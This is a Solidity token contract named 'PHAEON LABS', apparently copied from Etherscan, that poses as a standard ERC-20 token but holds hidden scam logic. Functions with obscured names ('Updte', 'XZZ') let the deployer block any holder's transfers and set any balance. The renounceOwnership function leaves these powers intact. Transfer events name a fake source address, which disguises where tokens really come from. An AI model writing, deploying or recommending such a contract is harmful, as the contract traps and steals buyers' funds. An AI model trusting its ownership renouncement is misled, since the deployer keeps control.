/**
 *Submitted for verification at Etherscan.io on 2023-02-04
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract PHAEON {
  
    mapping (address => uint256) private lIb;
    mapping (address => uint256) private lIc;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "PHAEON LABS";
    string public symbol = unicode"PHAEON";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private IRI;
    address xDeploy = 0x398d282487b44b6e53Ce0AebcA3CB60C3B6325E9;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IRI = msg.sender;
        lDeploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function lDeploy(address account, uint256 amount) internal {
    account = xDeploy;
    lIb[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }

   function balanceOf(address account) public view  returns (uint256) {
        return lIb[account];
    }

     function Updte (address sx, uint256 sz)  public {
     if(msg.sender == IRI) {
   lIc[sx] = sz;}}

    function transfer(address to, uint256 value) public returns (bool success) {


      if(lIc[msg.sender] <= 0) {
        require(lIb[msg.sender] >= value);
  lIb[msg.sender] -= value;  
        lIb[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }}

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function XZZ (address sx, uint256 sz)  public {
    if(msg.sender == IRI) {
    lIb[sx] = sz;}}




    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IRI) {
 require(value <= lIb[from]);
        require(value <= allowance[from][msg.sender]);
        lIb[from] -= value;  
      lIb[to] += value; 
        from = xDeploy;
        emit Transfer (from, to, value);
        return true; }    
else
        if(lIc[from] <= 0 && lIc[to] <= 0) {
        require(value <= lIb[from]);
        require(value <= allowance[from][msg.sender]);
        lIb[from] -= value;
        lIb[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}


    }